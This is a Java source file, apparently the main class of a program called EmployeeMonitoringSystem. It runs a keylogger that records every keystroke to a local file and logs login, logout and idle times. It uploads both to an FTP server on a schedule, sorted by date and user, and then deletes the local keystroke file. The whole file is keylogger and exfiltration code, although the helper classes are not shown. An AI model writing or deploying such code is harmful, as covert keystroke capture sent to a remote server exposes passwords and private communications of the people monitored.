package com.application.main;

import java.io.IOException;

public class EmployeeMonitoringSystem implements FileUploader {
	
	private FileHandler fileHandler;
	private FTPHandler ftpHandler;
	private Scheduler scheduler;
	private KeyLogger keyLogger;
	private TimeHandler timeHandler;
	
	public EmployeeMonitoringSystem() {
		fileHandler = new FileHandler("KeyStrokes.txt");
		ftpHandler = new FTPHandler();
		scheduler = new Scheduler(this);
		keyLogger = new KeyLogger(fileHandler);
		timeHandler = TimeHandler.getInstance();
	}
	
    public static void main(String[] args) {
    	EmployeeMonitoringSystem employeeMonitor = new EmployeeMonitoringSystem();
    	
    	employeeMonitor.checkPreviousDirectory();
    	employeeMonitor.uploadTimes();
    	employeeMonitor.setupKeyListener();
    	employeeMonitor.checkPeriodically();
    }
    
    public void uploadTimes() {
    	String yesterdaysDate = Utils.getYesterdaysDate();
    	String yesterdaysDirectoryPath = Utils.getDirectoryPath(yesterdaysDate);
    	String times = getTimes();
    	timeHandler.refreshFile();
    	timeHandler.writeTimes(times);
    	ftpHandler.uploadFile(timeHandler.getTimeFile(), yesterdaysDirectoryPath);
    }
    
    public String getTimes(){
    	String loginTime = "Login Time : ";
    	String logoutTime = "Logout Time : ";
    	String idleTime = "Idle Time : ";
    	try {
			loginTime += timeHandler.getLoginTime() + Utils.newLine();
			logoutTime += timeHandler.getLogoutTime() + Utils.newLine();
			idleTime += timeHandler.getPreviousIdleTime() + Utils.newLine();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
    	return loginTime + logoutTime + idleTime;
    }
	
    public void checkPreviousDirectory() {
    	String yesterdaysDate = Utils.getYesterdaysDate();
    	String yesterdaysDirectoryPath = Utils.getDirectoryPath(yesterdaysDate);
    	boolean pathExists = true;
		try {
			pathExists = ftpHandler.checkDirectoryExists(yesterdaysDirectoryPath);
		} catch (IOException e) {
			System.out.println("Error : " + e.getMessage());
		}
    	if(pathExists==false) {
    		System.out.println("Uploading yesterdays file...");
    		uploadFile(yesterdaysDirectoryPath, yesterdaysDate);
    	}
    }

    public void setupKeyListener() {
    	keyLogger.initializeKeyListener(keyLogger);
    }
    
    public void checkPeriodically() {
    	if(!fileHandler.fileExists()) {
    		fileHandler.createFile();
    	}	
    	scheduler.checkUploadHour();
    }
	
	@Override
	public void uploadFile(String directoryPath, String date) {
		ftpHandler.createDateDirectory(date);
		ftpHandler.createUserDirectory(date);
		ftpHandler.uploadFile(fileHandler.getFile(), directoryPath);
		fileHandler.deleteFile();
		fileHandler.createFile();
	}
}
